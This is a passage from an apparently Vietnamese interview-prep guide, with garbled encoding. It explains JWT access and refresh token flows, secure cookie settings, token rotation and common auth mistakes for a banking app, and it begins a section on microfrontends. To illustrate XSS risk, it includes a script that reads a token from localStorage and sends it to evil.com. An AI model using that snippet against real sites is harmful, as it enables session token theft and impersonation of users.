**B. API Call Flow (Gá»i API vá»›i Access Token):**

```typescript
// ============================================
// Frontend: Gá»i API vá»›i Access Token
// ============================================

// Helper function: Tá»± Ä‘á»™ng attach Access Token
async function apiCall(url: string, options: RequestInit = {}) {
  // Náº¿u Access Token háº¿t háº¡n â†’ refresh trÆ°á»›c
  if (isTokenExpired(accessToken)) {
    await refreshAccessToken();
  }
  
  // Gá»­i request vá»›i Access Token
  const response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${accessToken}`,  // Gá»­i token
    },
    credentials: 'include',  // Gá»­i cookies (refresh token)
  });
  
  // Náº¿u 401 Unauthorized â†’ token invalid, logout
  if (response.status === 401) {
    await logout();
    window.location.href = '/login';
    throw new Error('Unauthorized');
  }
  
  return response.json();
}

// Usage: Gá»i API láº¥y sá»‘ dÆ° tÃ i khoáº£n
const balance = await apiCall('https://api.bank.com/account/balance');
console.log(balance); // { balance: 1000000, currency: 'VND' }

// ============================================
// Backend: Verify Access Token
// ============================================

// Middleware: Verify JWT token
function authenticateToken(req, res, next) {
  // 1. Láº¥y token tá»« header
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];  // "Bearer <token>"
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  // 2. Verify token
  jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, user) => {
    if (err) {
      // Token expired hoáº·c invalid
      return res.status(403).json({ error: 'Invalid token' });
    }
    
    // 3. Attach user info vÃ o request
    req.user = user;  // { sub: "123", role: "trader", ... }
    next();
  });
}

// Protected route
app.get('/account/balance', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  const balance = await db.getBalance(userId);
  res.json(balance);
});
```

---

**C. Refresh Token Flow (LÃ m Má»›i Access Token):**

```typescript
// ============================================
// Frontend: Refresh Access Token
// ============================================

async function refreshAccessToken(): Promise<void> {
  try {
    const response = await fetch('https://api.bank.com/auth/refresh', {
      method: 'POST',
      credentials: 'include',  // Gá»­i httpOnly cookie (refreshToken)
      headers: {
        'Content-Type': 'application/json',
      },
    });
    
    if (!response.ok) {
      // Refresh token háº¿t háº¡n hoáº·c invalid â†’ logout
      throw new Error('Refresh token expired');
    }
    
    const data = await response.json();
    // {
    //   accessToken: "new-token...",
    //   expiresIn: 900
    // }
    
    // Cáº­p nháº­t Access Token má»›i
    accessToken = data.accessToken;
    
    console.log('Access token refreshed');
  } catch (error) {
    console.error('Refresh failed:', error);
    
    // Logout user
    await logout();
    window.location.href = '/login';
  }
}

// Auto-refresh token trÆ°á»›c khi háº¿t háº¡n
function startTokenRefreshTimer() {
  // Refresh token trÆ°á»›c 1 phÃºt khi háº¿t háº¡n
  const refreshTime = (15 - 1) * 60 * 1000;  // 14 phÃºt
  
  setInterval(async () => {
    await refreshAccessToken();
  }, refreshTime);
}

// Gá»i khi app khá»Ÿi Ä‘á»™ng
startTokenRefreshTimer();

// ============================================
// Backend: Refresh Token Endpoint
// ============================================

app.post('/auth/refresh', async (req, res) => {
  // 1. Láº¥y Refresh Token tá»« httpOnly cookie
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    // 2. Verify Refresh Token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
    
    // 3. Check token trong database (chÆ°a bá»‹ revoke?)
    const tokenRecord = await db.findRefreshToken(decoded.jti);
    if (!tokenRecord || tokenRecord.isRevoked) {
      return res.status(403).json({ error: 'Token revoked' });
    }
    
    // 4. Check user váº«n cÃ²n active
    const user = await db.findUserById(decoded.sub);
    if (!user || user.isLocked) {
      return res.status(403).json({ error: 'User inactive' });
    }
    
    // 5. Generate Access Token má»›i
    const newAccessToken = jwt.sign(
      {
        sub: user.id,
        name: user.name,
        email: user.email,
        role: user.role,
        permissions: user.permissions,
      },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );
    
    // 6. Log refresh event
    await logEvent({
      type: 'TOKEN_REFRESH',
      userId: user.id,
      tokenId: decoded.jti,
      timestamp: new Date(),
    });
    
    // 7. Return Access Token má»›i
    res.json({
      accessToken: newAccessToken,
      expiresIn: 900,
    });
    
  } catch (error) {
    // Token expired hoáº·c invalid
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});
```

---

**D. Logout Flow (ÄÄƒng Xuáº¥t):**

```typescript
// ============================================
// Frontend: Logout
// ============================================

async function logout(): Promise<void> {
  try {
    // 1. Gá»i API logout (revoke refresh token)
    await fetch('https://api.bank.com/auth/logout', {
      method: 'POST',
      credentials: 'include',  // Gá»­i refreshToken cookie
    });
    
    // 2. XÃ³a Access Token khá»i memory
    accessToken = null;
    
    // 3. XÃ³a user info khá»i localStorage
    localStorage.removeItem('user');
    
    // 4. Clear any cached data
    sessionStorage.clear();
    
    // 5. Redirect to login
    window.location.href = '/login';
    
  } catch (error) {
    console.error('Logout error:', error);
    // Váº«n redirect vá» login dÃ¹ cÃ³ lá»—i
    window.location.href = '/login';
  }
}

// ============================================
// Backend: Logout Endpoint
// ============================================

app.post('/auth/logout', async (req, res) => {
  // 1. Láº¥y Refresh Token tá»« cookie
  const refreshToken = req.cookies.refreshToken;
  
  if (refreshToken) {
    try {
      // 2. Decode token
      const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
      
      // 3. Revoke token trong database (blacklist)
      await db.revokeRefreshToken(decoded.jti);
      
      // 4. Log logout event
      await logEvent({
        type: 'LOGOUT',
        userId: decoded.sub,
        tokenId: decoded.jti,
        timestamp: new Date(),
      });
      
    } catch (error) {
      console.error('Logout error:', error);
    }
  }
  
  // 5. XÃ³a Refresh Token cookie
  res.clearCookie('refreshToken', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/auth/refresh',
  });
  
  // 6. Return success
  res.json({ message: 'Logged out successfully' });
});
```

---

#### **ğŸ›¡ï¸ 3. Security Best Practices (Thá»±c HÃ nh Báº£o Máº­t)**

**A. Cookie Security:**

```typescript
// ============================================
// SECURE COOKIE CONFIGURATION
// ============================================

// âœ… ÄÃšNG: Secure httpOnly Cookie
res.cookie('refreshToken', token, {
  httpOnly: true,    // JavaScript KHÃ”NG Ä‘á»c Ä‘Æ°á»£c (chá»‘ng XSS)
  secure: true,      // Chá»‰ gá»­i qua HTTPS (khÃ´ng qua HTTP)
  sameSite: 'strict', // Chá»‘ng CSRF (khÃ´ng gá»­i cross-site)
  maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 ngÃ y
  path: '/auth/refresh',  // Chá»‰ gá»­i tá»›i endpoint refresh
  domain: '.bank.com',  // Cho phÃ©p subdomain
});

// âŒ SAI: KhÃ´ng secure
res.cookie('refreshToken', token, {
  httpOnly: false,   // âŒ JS Ä‘á»c Ä‘Æ°á»£c â†’ XSS risk
  secure: false,     // âŒ Gá»­i qua HTTP â†’ MITM attack
  sameSite: 'none',  // âŒ Gá»­i cross-site â†’ CSRF risk
});

// ============================================
// Cookie Attributes Giáº£i ThÃ­ch
// ============================================

/**
 * httpOnly: true
 * - JavaScript khÃ´ng Ä‘á»c Ä‘Æ°á»£c: document.cookie = undefined
 * - Chá»‰ server Ä‘á»c Ä‘Æ°á»£c
 * - Chá»‘ng XSS: Hacker inject script cÅ©ng khÃ´ng láº¥y Ä‘Æ°á»£c cookie
 * 
 * secure: true
 * - Chá»‰ gá»­i qua HTTPS (khÃ´ng qua HTTP)
 * - Chá»‘ng MITM (Man-In-The-Middle) attack
 * - Production MUST cÃ³
 * 
 * sameSite: 'strict'
 * - KhÃ´ng gá»­i cookie khi navigate tá»« site khÃ¡c
 * - Example: evil.com â†’ bank.com (cookie KHÃ”NG gá»­i)
 * - Chá»‘ng CSRF attack
 * - Options: 'strict' | 'lax' | 'none'
 *   - strict: KhÃ´ng gá»­i cross-site (most secure)
 *   - lax: Gá»­i khi GET navigation (moderate)
 *   - none: Gá»­i má»i cross-site (least secure)
 * 
 * path: '/auth/refresh'
 * - Cookie chá»‰ gá»­i tá»›i endpoint nÃ y
 * - Giáº£m exposure (khÃ´ng gá»­i tá»›i má»i endpoint)
 * 
 * domain: '.bank.com'
 * - Cho phÃ©p subdomain: api.bank.com, www.bank.com
 * - KhÃ´ng set = chá»‰ exact domain
 */
```

**B. Token Storage:**

```typescript
// ============================================
// WHERE TO STORE TOKENS?
// ============================================

// âœ… Access Token: MEMORY (JavaScript variable)
let accessToken: string | null = null;

// LÃ½ do:
// - Máº¥t khi refresh page (an toÃ n hÆ¡n)
// - KhÃ´ng bá»‹ XSS náº¿u page refresh
// - Short-lived (15 phÃºt) nÃªn OK

// âœ… Refresh Token: httpOnly Cookie
// Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict

// LÃ½ do:
// - JavaScript khÃ´ng Ä‘á»c Ä‘Æ°á»£c (chá»‘ng XSS)
// - Auto gá»­i vá»›i requests (convenient)
// - Long-lived nhÆ°ng secure

// âŒ NEVER:
localStorage.setItem('accessToken', token);  // âŒ XSS risk!
sessionStorage.setItem('accessToken', token);  // âŒ Váº«n XSS risk!
document.cookie = `accessToken=${token}`;  // âŒ Readable by JS

// ============================================
// XSS Attack Example
// ============================================

// Náº¿u lÆ°u token trong localStorage:
// Hacker inject script:
<script>
  // Steal token
  const token = localStorage.getItem('accessToken');
  
  // Send to hacker server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token }),
  });
  
  // Now hacker cÃ³ token â†’ impersonate user!
</script>

// Náº¿u dÃ¹ng httpOnly cookie:
// Hacker inject script:
<script>
  // Try to steal
  const token = document.cookie; // undefined (httpOnly)
  
  // Cannot access! âœ… Secure
</script>
```

**C. Token Rotation (Xoay VÃ²ng Token):**

```typescript
// ============================================
// REFRESH TOKEN ROTATION
// ============================================

// Backend: Má»—i láº§n refresh â†’ generate token má»›i
app.post('/auth/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;
  
  // Verify old token
  const decoded = jwt.verify(oldRefreshToken, SECRET);
  
  // Generate NEW Access Token
  const newAccessToken = jwt.sign({ ... }, SECRET, { expiresIn: '15m' });
  
  // Generate NEW Refresh Token (rotation)
  const newRefreshToken = jwt.sign(
    { jti: uuidv4(), sub: decoded.sub },
    SECRET,
    { expiresIn: '30d' }
  );
  
  // Revoke old Refresh Token
  await db.revokeRefreshToken(decoded.jti);
  
  // Save new Refresh Token
  await db.saveRefreshToken(newRefreshToken);
  
  // Set new Refresh Token cookie
  res.cookie('refreshToken', newRefreshToken, { httpOnly: true, ... });
  
  // Return new Access Token
  res.json({ accessToken: newAccessToken });
});

// Lá»£i Ã­ch:
// - Má»—i láº§n refresh â†’ token má»›i
// - Old token bá»‹ revoke â†’ khÃ´ng dÃ¹ng láº¡i Ä‘Æ°á»£c
// - Náº¿u hacker cÃ³ old token â†’ useless
// - Detect reuse attack (token revoked mÃ  váº«n dÃ¹ng)
```

---

#### **ğŸ”’ 4. Special Cases (CÃ¡c TrÆ°á»ng Há»£p Äáº·c Biá»‡t)**

**A. Concurrent Requests (Nhiá»u Request CÃ¹ng LÃºc):**

```typescript
// ============================================
// Problem: Race Condition
// ============================================

// User vá»«a má»Ÿ 10 tabs, má»—i tab gá»i API
// â†’ 10 requests cÃ¹ng lÃºc
// â†’ Token háº¿t háº¡n
// â†’ 10 refresh requests cÃ¹ng lÃºc âŒ

// ============================================
// Solution: Request Queue vá»›i Promise
// ============================================

let refreshPromise: Promise<string> | null = null;

async function getValidToken(): Promise<string> {
  // Náº¿u token cÃ²n hiá»‡u lá»±c â†’ return luÃ´n
  if (accessToken && !isTokenExpired(accessToken)) {
    return accessToken;
  }
  
  // Náº¿u Ä‘ang refresh â†’ chá» promise hiá»‡n táº¡i
  if (refreshPromise) {
    return await refreshPromise;
  }
  
  // Táº¡o promise má»›i Ä‘á»ƒ refresh
  refreshPromise = refreshAccessToken().then((newToken) => {
    refreshPromise = null;  // Reset
    return newToken;
  });
  
  return await refreshPromise;
}

async function apiCall(url: string) {
  const token = await getValidToken();  // Chá» token valid
  
  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`,
    },
  });
}

// Káº¿t quáº£:
// - 10 requests Ä‘áº§u tiÃªn trigger refresh
// - Chá»‰ 1 refresh request thá»±c sá»± gá»­i Ä‘i
// - 9 requests cÃ²n láº¡i chá» promise Ä‘Ã³
// - Táº¥t cáº£ dÃ¹ng chung 1 token má»›i
```

**B. Inactivity Timeout (Tá»± Äá»™ng Logout Khi KhÃ´ng Hoáº¡t Äá»™ng):**

```typescript
// ============================================
// AUTO LOGOUT AFTER INACTIVITY
// (Banking/Trading yÃªu cáº§u)
// ============================================

class InactivityTimer {
  private timeout: number = 5 * 60 * 1000;  // 5 phÃºt khÃ´ng hoáº¡t Ä‘á»™ng
  private timer: NodeJS.Timeout | null = null;
  
  constructor() {
    this.startTimer();
    this.listenActivity();
  }
  
  // Báº¯t Ä‘áº§u Ä‘áº¿m
  private startTimer() {
    this.clearTimer();
    
    this.timer = setTimeout(() => {
      this.onTimeout();
    }, this.timeout);
  }
  
  // Reset timer khi cÃ³ activity
  private resetTimer() {
    this.startTimer();
  }
  
  // Láº¯ng nghe user activity
  private listenActivity() {
    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];
    
    events.forEach((event) => {
      document.addEventListener(event, () => {
        this.resetTimer();
      }, { passive: true });
    });
  }
  
  // Timeout â†’ logout
  private onTimeout() {
    console.log('Inactivity timeout - logging out');
    
    // Show warning dialog
    showWarningDialog('Báº¡n Ä‘Ã£ khÃ´ng hoáº¡t Ä‘á»™ng trong 5 phÃºt. Vui lÃ²ng Ä‘Äƒng nháº­p láº¡i.');
    
    // Logout
    logout();
  }
  
  private clearTimer() {
    if (this.timer) {
      clearTimeout(this.timer);
      this.timer = null;
    }
  }
}

// Usage:
const inactivityTimer = new InactivityTimer();
```

**C. Device Fingerprinting (Nháº­n Diá»‡n Thiáº¿t Bá»‹):**

```typescript
// ============================================
// DEVICE FINGERPRINTING
// ============================================

function getDeviceFingerprint(): string {
  const data = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenResolution: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    colorDepth: screen.colorDepth,
    cpuCores: navigator.hardwareConcurrency,
  };
  
  // Hash fingerprint
  const fingerprint = hashSHA256(JSON.stringify(data));
  return fingerprint;
}

// Backend: Verify device
app.post('/auth/login', async (req, res) => {
  const { deviceId } = req.body;
  const user = await db.findUser(...);
  
  // Check device Ä‘Ã£ Ä‘Äƒng kÃ½ chÆ°a
  const knownDevice = await db.findDevice(user.id, deviceId);
  
  if (!knownDevice) {
    // Thiáº¿t bá»‹ má»›i â†’ send OTP/email verification
    await sendOTPEmail(user.email);
    
    return res.status(403).json({
      error: 'Unknown device',
      requireOTP: true,
    });
  }
  
  // Device OK â†’ proceed login
  // ...
});
```

**D. Logout All Devices (ÄÄƒng Xuáº¥t Táº¥t Cáº£ Thiáº¿t Bá»‹):**

```typescript
// ============================================
// LOGOUT ALL DEVICES
// ============================================

// Frontend: Trigger logout all
async function logoutAllDevices() {
  await fetch('https://api.bank.com/auth/logout-all', {
    method: 'POST',
    credentials: 'include',
  });
  
  // Redirect to login
  window.location.href = '/login';
}

// Backend: Revoke all refresh tokens
app.post('/auth/logout-all', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
  // Revoke táº¥t cáº£ refresh tokens cá»§a user
  await db.revokeAllRefreshTokens(userId);
  
  // Log event
  await logEvent({
    type: 'LOGOUT_ALL_DEVICES',
    userId,
    timestamp: new Date(),
  });
  
  res.json({ message: 'Logged out from all devices' });
});

// Use case:
// - User nghi ngá» account bá»‹ hack
// - Change password â†’ logout all devices
// - Admin revoke access
```

---

#### **âš ï¸ 5. Common Security Mistakes (Lá»—i Báº£o Máº­t ThÆ°á»ng Gáº·p)**

```typescript
// âŒ Lá»–I 1: LÆ°u token trong localStorage
localStorage.setItem('accessToken', token);  // XSS risk!

// âœ… ÄÃšNG: LÆ°u trong memory
let accessToken: string | null = null;

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// âŒ Lá»–I 2: Access Token thá»i háº¡n quÃ¡ dÃ i
jwt.sign(payload, secret, { expiresIn: '30d' });  // QuÃ¡ lÃ¢u!

// âœ… ÄÃšNG: 5-15 phÃºt
jwt.sign(payload, secret, { expiresIn: '15m' });

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// âŒ Lá»–I 3: KhÃ´ng verify token signature
const decoded = jwt.decode(token);  // âŒ Chá»‰ decode, khÃ´ng verify!

// âœ… ÄÃšNG: Verify signature
jwt.verify(token, secret, (err, decoded) => { ... });

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// âŒ Lá»–I 4: KhÃ´ng revoke refresh token khi logout
// User logout â†’ token váº«n valid â†’ hacker dÃ¹ng Ä‘Æ°á»£c

// âœ… ÄÃšNG: Revoke token vÃ o database blacklist
await db.revokeRefreshToken(tokenId);

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// âŒ Lá»–I 5: Gá»­i sensitive data trong token
jwt.sign({
  password: user.password,  // âŒ NEVER!
  creditCard: user.creditCard,  // âŒ NEVER!
}, secret);

// âœ… ÄÃšNG: Chá»‰ non-sensitive data
jwt.sign({
  sub: user.id,
  name: user.name,
  role: user.role,
}, secret);

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// âŒ Lá»–I 6: KhÃ´ng check token blacklist
// Token bá»‹ revoke nhÆ°ng váº«n accept

// âœ… ÄÃšNG: Check blacklist
const tokenRecord = await db.findRefreshToken(tokenId);
if (!tokenRecord || tokenRecord.isRevoked) {
  return res.status(403).json({ error: 'Token revoked' });
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// âŒ Lá»–I 7: KhÃ´ng rate limit refresh endpoint
// Hacker brute force refresh endpoint

// âœ… ÄÃšNG: Rate limit
app.use('/auth/refresh', rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 phÃºt
  max: 10,  // Max 10 requests
}));

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// âŒ Lá»–I 8: KhÃ´ng log security events
// KhÃ´ng biáº¿t khi nÃ o bá»‹ attack

// âœ… ÄÃšNG: Log everything
await logEvent({
  type: 'LOGIN_FAILED',
  username,
  ipAddress: req.ip,
  reason: 'Invalid password',
  timestamp: new Date(),
});
```

---

#### **ğŸ“Š 6. Complete Flow Diagram**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           COMPLETE AUTHENTICATION FLOW                             â”‚
â”‚      (Banking/Trading System - Há»‡ Thá»‘ng NgÃ¢n HÃ ng)                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

1ï¸âƒ£ LOGIN
   User                     Frontend                Backend
    â”‚                          â”‚                       â”‚
    â”‚â”€â”€â”€ Enter credentials â”€â”€â†’â”‚                       â”‚
    â”‚                          â”‚â”€â”€â”€ POST /login â”€â”€â”€â”€â”€â†’â”‚
    â”‚                          â”‚    {username, pwd}    â”‚
    â”‚                          â”‚                       â”‚
    â”‚                          â”‚                       â”‚â”€ Verify credentials
    â”‚                          â”‚                       â”‚â”€ Generate tokens
    â”‚                          â”‚                       â”‚â”€ Save refresh token
    â”‚                          â”‚                       â”‚
    â”‚                          â”‚â†â”€ Set-Cookie â”€â”€â”€â”€â”€â”€â”€â”€â”‚
    â”‚                          â”‚   refreshToken        â”‚
    â”‚                          â”‚   (httpOnly)          â”‚
    â”‚                          â”‚                       â”‚
    â”‚                          â”‚â†â”€ { accessToken } â”€â”€â”€â”‚
    â”‚â†â”€ Redirect /dashboard â”€â”‚                       â”‚
    â”‚                          â”‚                       â”‚
    â””â”€ accessToken in memory  â”‚                       â”‚

2ï¸âƒ£ API CALL
   User                     Frontend                Backend
    â”‚                          â”‚                       â”‚
    â”‚â”€â”€â”€ Click "View Balance"â†’â”‚                       â”‚
    â”‚                          â”‚â”€ GET /balance â”€â”€â”€â”€â”€â”€â†’â”‚
    â”‚                          â”‚   Authorization:      â”‚
    â”‚                          â”‚   Bearer <token>      â”‚
    â”‚                          â”‚                       â”‚
    â”‚                          â”‚                       â”‚â”€ Verify token
    â”‚                          â”‚                       â”‚â”€ Check permissions
    â”‚                          â”‚                       â”‚
    â”‚                          â”‚â†â”€ { balance: 1M } â”€â”€â”€â”‚
    â”‚â†â”€ Display balance â”€â”€â”€â”€â”€â”€â”‚                       â”‚

3ï¸âƒ£ TOKEN REFRESH (Auto - má»—i 14 phÃºt)
   Frontend                Backend
      â”‚                       â”‚
      â”‚â”€ POST /auth/refresh â†’â”‚
      â”‚   Cookie:             â”‚
      â”‚   refreshToken        â”‚
      â”‚                       â”‚
      â”‚                       â”‚â”€ Verify refresh token
      â”‚                       â”‚â”€ Check not revoked
      â”‚                       â”‚â”€ Generate new access token
      â”‚                       â”‚
      â”‚â†â”€ { accessToken } â”€â”€â”€â”‚
      â”‚                       â”‚
   Update accessToken         â”‚
   in memory                  â”‚

4ï¸âƒ£ LOGOUT
   User                     Frontend                Backend
    â”‚                          â”‚                       â”‚
    â”‚â”€â”€â”€ Click "Logout" â”€â”€â”€â”€â”€â†’â”‚                       â”‚
    â”‚                          â”‚â”€ POST /logout â”€â”€â”€â”€â”€â”€â†’â”‚
    â”‚                          â”‚   Cookie:             â”‚
    â”‚                          â”‚   refreshToken        â”‚
    â”‚                          â”‚                       â”‚
    â”‚                          â”‚                       â”‚â”€ Revoke token
    â”‚                          â”‚                       â”‚â”€ Clear cookie
    â”‚                          â”‚                       â”‚
    â”‚                          â”‚â†â”€ { success } â”€â”€â”€â”€â”€â”€â”€â”‚
    â”‚                          â”‚                       â”‚
    â”‚                          â”‚â”€ accessToken = null   â”‚
    â”‚                          â”‚â”€ Clear localStorage   â”‚
    â”‚â†â”€ Redirect /login â”€â”€â”€â”€â”€â”€â”‚                       â”‚
```

---

#### **ğŸ’¡ Summary (TÃ³m Táº¯t)**

**Access Token ğŸ”‘**
- **15 phÃºt**, lÆ°u **memory**, dÃ¹ng gá»i API
- Máº¥t khi refresh page â†’ re-fetch tá»« refresh token

**Refresh Token ğŸ”„**
- **30 ngÃ y**, lÆ°u **httpOnly cookie**, dÃ¹ng láº¥y access token
- Secure: httpOnly + Secure + SameSite=Strict

**Best Practices ğŸ›¡ï¸**
- âœ… Never localStorage (XSS risk)
- âœ… httpOnly cookie cho refresh token
- âœ… Short-lived access token (15 phÃºt)
- âœ… Token rotation (refresh â†’ new token)
- âœ… Revoke tokens khi logout
- âœ… Rate limiting
- âœ… Inactivity timeout (5-10 phÃºt)
- âœ… Device fingerprinting
- âœ… Audit logging

**Khi NÃ o Logout:**
- User click logout âœ…
- Inactivity > 5 phÃºt âœ…
- Refresh token expired âœ…
- Suspicious activity detected âœ…
- User change password âœ…
- Admin revoke access âœ…

**Khi NÃ o Giá»¯ Session:**
- User Ä‘ang hoáº¡t Ä‘á»™ng (reset timer)
- Refresh token cÃ²n valid
- Device trusted
- No security alerts

**Key Takeaway:**
- **Banking/Trading** yÃªu cáº§u báº£o máº­t Cá»°C CAO
- **2 tokens** (access + refresh) = balance giá»¯a UX vÃ  security
- **httpOnly cookie** = chá»‘ng XSS
- **Short-lived tokens** = giáº£m impact khi leak
- **Audit logging** = detect suspicious activities
- **Multi-factor** everything (MFA, device fingerprint, inactivity timeout)

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ§± Q56: Microfrontend & Monorepo - Module Federation, Multi-Framework, Communication Patterns</span></summary>


**â“ CÃ¢u Há»i:**

Giáº£i thÃ­ch chi tiáº¿t kiáº¿n trÃºc Microfrontend vÃ  Monorepo, bao gá»“m Module Federation (Webpack/Vite), Multi-framework development, Communication patterns, Routing strategies, vÃ  Styling isolation. PhÃ¢n tÃ­ch Æ°u nhÆ°á»£c Ä‘iá»ƒm vÃ  á»©ng dá»¥ng thá»±c táº¿.

**ğŸ“š Pháº§n 1: KhÃ¡i Niá»‡m CÆ¡ Báº£n (Core Concepts)**

#### **ğŸ’¡ Microfrontend LÃ  GÃ¬? (What is Microfrontend?)**

**Microfrontend** lÃ  kiáº¿n trÃºc chia á»©ng dá»¥ng frontend lá»›n thÃ nh **nhiá»u á»©ng dá»¥ng nhá» Ä‘á»™c láº­p**, má»—i á»©ng dá»¥ng:
- âœ… ÄÆ°á»£c phÃ¡t triá»ƒn bá»Ÿi **team riÃªng** (Ä‘á»™c láº­p)
- âœ… Deploy **riÃªng biá»‡t** (independent deployment)
- âœ… CÃ³ **technology stack riÃªng** (React, Vue, Angular, etc.)
- âœ… **Runtime integration** (ghÃ©p ná»‘i lÃºc runtime, khÃ´ng pháº£i build time)

---

#### **ğŸ”¥ Táº¡i Sao Cáº§n Microfrontend? (Why Microfrontend?)**

**ğŸ’” Váº¥n Äá» Cá»§a Monolithic Frontend (The Problem):**

```typescript
// ===================================================
// âŒ MONOLITHIC FRONTEND - VÃ Dá»¤ THá»°C Táº¾
// ===================================================

// TÃ¬nh huá»‘ng: CÃ´ng ty e-commerce lá»›n vá»›i 1 app React khá»•ng lá»“

ğŸ“¦ ecommerce-app/
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ pages/
â”‚   â”‚   â”œâ”€â”€ ProductCatalog/      â† Team A maintain (10 devs)
â”‚   â”‚   â”œâ”€â”€ ShoppingCart/        â† Team B maintain (8 devs)
â”‚   â”‚   â”œâ”€â”€ Checkout/            â† Team C maintain (12 devs)
â”‚   â”‚   â”œâ”€â”€ UserProfile/         â† Team D maintain (6 devs)
â”‚   â”‚   â”œâ”€â”€ OrderHistory/        â† Team E maintain (5 devs)
â”‚   â”‚   â””â”€â”€ AdminDashboard/      â† Team F maintain (8 devs)
â”‚   â”‚
â”‚   â””â”€â”€ package.json             â† 1 file duy nháº¥t cho táº¥t cáº£!
â”‚       dependencies: {
â”‚         "react": "17.0.0",     â† Team A muá»‘n upgrade React 18
â”‚         "redux": "4.0.0",      â† Team C muá»‘n dÃ¹ng Zustand
â”‚         ...500 dependencies    â† CÃ i Ä‘áº·t CHáº¬M (5-10 phÃºt!)
â”‚       }
```

**âŒ Váº¥n Äá» 1: DEPLOYMENT HELL (Äá»‹a Ngá»¥c Deploy)**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         MONOLITHIC DEPLOYMENT NIGHTMARE                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                           â”‚
â”‚  Team A fix bug nhá» trong ProductCatalog (1 dÃ²ng code)  â”‚
â”‚              â†“                                            â”‚
â”‚  âŒ Pháº£i build TOÃ€N Bá»˜ app (15-20 phÃºt)                 â”‚
â”‚  âŒ Test TOÃ€N Bá»˜ app (2-3 giá»)                          â”‚
â”‚  âŒ Deploy TOÃ€N Bá»˜ app â†’ risk cho táº¥t cáº£ teams!         â”‚
â”‚  âŒ Náº¿u cÃ³ bug â†’ TOÃ€N Bá»˜ app down!                      â”‚
â”‚                                                           â”‚
â”‚  Timeline:                                                â”‚
